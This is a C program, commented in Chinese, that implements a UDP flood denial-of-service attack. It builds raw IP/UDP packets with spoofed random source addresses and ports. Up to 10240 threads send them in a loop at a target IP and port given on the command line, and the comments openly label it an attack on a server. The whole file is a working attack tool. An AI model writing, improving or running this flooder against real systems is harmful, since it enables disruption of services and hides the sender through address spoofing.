#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#define MAX 10240

int sockfd = -1;
//循环标志
int flag = 1;
int send_udp_dos(int connfd,struct sockaddr_in *paddr);
//信号处理函数
void handler(int signo)
{
    printf("捕捉到信号： %d\n",signo);
    flag = 0;
}
//线程处理函数 循环发送udp攻击包
void *fun(void *arg)
{
    struct sockaddr_in *addr = arg;
    while(flag)
    {
	send_udp_dos(sockfd,addr);
    }
    //线程退出
    pthread_exit(NULL);
}
//计算16位udp校验和
unsigned short checksum(unsigned char *buf, int len)
{
    unsigned int sum = 0;
    unsigned short *cbuf;

    cbuf = (unsigned short *)buf;


    while(len>1)
    {
        sum+=*cbuf++;
        len-=2;
    }
    if(len)
    {
        sum+=*(unsigned char *)cbuf;
    }
    sum =(sum >> 16)+(sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}
//组织udp数据包
int send_udp_dos(int connfd,struct sockaddr_in *paddr){
    int len = 0;
    int ret = -1;
    char *packet = NULL;
    char *data = NULL;
    struct ip *ipheader = NULL;
    struct udphdr *udpheader = NULL;
    //分配地址空间 ip首部+udp首部+数据
    len = sizeof(struct ip) + sizeof(struct udphdr) + 64;
    packet = malloc(len);

    if (NULL==packet)
    {
        printf("malloc failed...\n");
        return 1;
    }
    //内存清零
    memset(packet,0,len);
    //第一部分：ip首部
    ipheader = (struct ip*)packet;
    //第二部分：udp首部
    udpheader = (struct udphdr*)(packet + sizeof(struct ip));
    //第三部分：数据
    data = packet +sizeof(struct ip) + sizeof(struct udphdr);

    //封装ip协议
    ipheader->ip_v=4;
    //首部长度 20字节 20/4 =5
    ipheader->ip_hl=5;
    //区分服务，暂时没有使用
    ipheader->ip_tos=0;
    //总长度 转化为网络序
    ipheader->ip_len =htons(len);
    //标识 随机
    ipheader->ip_id = random()%1024;
    //标志+片偏移
    ipheader->ip_off=0;
    //生存时间
    ipheader->ip_ttl = 64;
    //协议
    ipheader->ip_p = IPPROTO_UDP;
    //首部校验和 暂时填0
    ipheader->ip_sum = 0;
    ipheader->ip_sum = checksum((unsigned char *)ipheader,sizeof(struct ip));

    //随机源地址
    ipheader->ip_src.s_addr = random()%1024;
    //目的地址 参数paddr 传递进来的
    ipheader->ip_dst = paddr->sin_addr;
    //封装udp协议
    //随机端口
    udpheader->uh_sport = 1024 + random()%100;
    //目的端口
    udpheader->uh_dport = paddr->sin_port;
    //长度 udp首部+数据
    udpheader->uh_ulen = htons(sizeof(struct udphdr)+64);
    //校验和
    udpheader->uh_sum = 0;
    udpheader->uh_sum = checksum((unsigned char *)udpheader,sizeof(struct udphdr)+64);
    //填充数据
    strcpy(data,"testing.mao.com");
    //发送数据
    //第一个参数：套接字
    //第二个参数：发送数据
    //第三个参数：发送数据长度
    //第四个参数：标志
    //第五个参数：服务端addr结构
    //第六个参数：sizeof(struct sockaddr_in)
    ret = sendto(connfd,packet,len,0,(void*)paddr,sizeof(struct sockaddr_in));
    if(ret<=0)
    {
        perror("sendto");
        return -1;
    }
    printf("ret:%d\n",ret);
    //释放内存
    free(packet);
}
//udp洪水攻击
int main(int argc,char **argv)//服务器端的端口和ip地址通过参数传入
{
    int ret = -1;
    int on = -1;
    int i =0;
    //保存线程tid 线程号
    pthread_t tid[MAX];
    //填写服务端的信息
    struct sockaddr_in addr;

    //0.参数检查
    //argv[0] 可执行文件
    //argv[1] ip
    //argv[2] 端口
    if (3 != argc)
    {
        printf("usaage: ./a.out IP port\n");
    }
    //注册信号 软件中断
    //第一个参数 信号编号 SIGINT Ctrl + C产生
    //第二个参数 信号处理函数 用户按下 Ctrl + C就会调用回调函数handler
    
    signal(SIGINT,handler);
    

    //1.创建套接字，使用socket函数，man socket,返回值为int类型
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (-1 == sockfd)
    {
        //输出出错原因
        perror("socket");
        return 1;
    }
    printf("sockfd = %d\n",sockfd);
    //设置自己封装ip
    on = 1;//表示使能
    ret = setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    if(-1==ret)
    {
        perror("setsocket");
        return -1;
    }
    //2.初始化结构体 服务端IP,端口
    //man 7 ip
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;//ipv4
    //将字符串转为int类型"123"-->123
    addr.sin_port = htons(atoi(argv[2]));//网络序是大端模式本地是小端模式，超过2字节要转化
    //填充ip
    //字符串ip转为大端模式的ip
    inet_pton(AF_INET, argv[1], (void*)&addr.sin_addr);
    printf("攻击的服务器IP：%s 端口：%s\n",argv[1],argv[2]);
    
    //循环创建线程
    for (i=0; i<MAX; i++)
    {
	//第一个参数 传出线程号
        //第二个参数 线程属性
	//第三个参数 线程处理函数 线程启动后执行函数
	//第四个参数 传递给线程处理函数的参数
	pthread_create(&tid[i],NULL,fun,(void*)&addr);

    }
    //等待所有线程退出
    for(i=0;i<MAX;i++)
    {
	//第一个参数 线程id
	//第二个参数 传出线程退出状态
	pthread_join(tid[i],NULL);
    }
    //3.循环发送数据
    /*while(1)
    {
        send_udp_dos(sockfd,&addr);
    }*/
    //4.关闭文件描述符
    close(sockfd);

    return 0;
}
